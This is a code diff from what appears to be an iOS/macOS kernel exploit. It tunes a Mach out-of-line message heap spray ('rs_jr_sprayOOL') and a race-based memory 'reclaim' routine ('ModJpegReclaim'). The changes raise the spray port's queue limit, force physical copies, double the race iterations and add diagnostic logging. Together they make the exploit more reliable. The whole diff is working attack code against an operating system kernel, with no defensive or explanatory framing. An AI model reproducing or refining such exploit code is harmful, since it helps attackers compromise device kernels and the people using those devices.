@@ -976,6 +976,7 @@ static int rs_jr_sprayOOL(mach_port_t port, int count, int safeMode) {
     memset(payload + 128, 0, 8);   // request+128 self-ptr = NULL -> no deref
     payload[784] = 0;              // request+784 flags   = 0    -> no fault
     int sent = 0;
+    kern_return_t firstFail = 0;
     for (int i = 0; i < count; i++) {
         struct {
             mach_msg_header_t          header;
@@ -991,12 +992,15 @@ static int rs_jr_sprayOOL(mach_port_t port, int count, int safeMode) {
         msg.ool.address = payload;
         msg.ool.size = size;
         msg.ool.deallocate = FALSE;
+        msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
         msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
         kern_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
-        if (kr != KERN_SUCCESS) break;
+        if (kr != KERN_SUCCESS) { if (!firstFail) firstFail = kr; break; }
         sent++;
     }
+    if (firstFail)
+        AveLog(S(@"[jpeg440]   spray stopped at %d: mach_msg kr=%#x (port queue full?)", sent, firstFail));
     free(payload);
     return sent;
 }
@@ -1045,8 +1049,16 @@ NSString *ModJpegReclaim(void) {
     mach_port_t sprayPort = MACH_PORT_NULL;
     if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort) != KERN_SUCCESS)
         sprayPort = MACH_PORT_NULL;
-    if (sprayPort != MACH_PORT_NULL)
+    if (sprayPort != MACH_PORT_NULL) {
         mach_port_insert_right(mach_task_self(), sprayPort, sprayPort, MACH_MSG_TYPE_MAKE_SEND);
+        // CRITICAL: a receive port's queue defaults to MACH_PORT_QLIMIT_DEFAULT
+        // = 5 messages, so the OOL spray dies after 5 sends (measured: spray=5
+        // then spray=0).  Raise it or the reclaim never actually sprays.
+        kern_return_t ql = mach_port_set_qlimit(mach_task_self(), sprayPort, 4096);
+        AveLog(S(@"[jpeg440] spray port=%#x qlimit(4096) kr=%#x", sprayPort, ql));
+    } else {
+        AveLog(@"[jpeg440] spray port allocation FAILED - no reclaim spray possible");
+    }
 
     int64_t wired0 = rs_wired_pages();
     AveLog(S(@"[jpeg440] wired before: %lld pages", wired0));
@@ -1102,7 +1114,7 @@ NSString *ModJpegReclaim(void) {
             }
         });
         dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-            for (int i = 0; i < RACE_ITERS * 10; i++)
+            for (int i = 0; i < RACE_ITERS * 20; i++)
                 __sync_fetch_and_add(&raceS, rs_jr_sprayOOL(sprayPort, 1, 1));
         });
         dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
@@ -1133,7 +1145,7 @@ NSString *ModJpegReclaim(void) {
             }
         });
         dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-            for (int i = 0; i < RACE_ITERS * 10; i++)
+            for (int i = 0; i < RACE_ITERS * 20; i++)
                 __sync_fetch_and_add(&raceS, rs_jr_sprayOOL(sprayPort, 1, 0));
         });
         dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
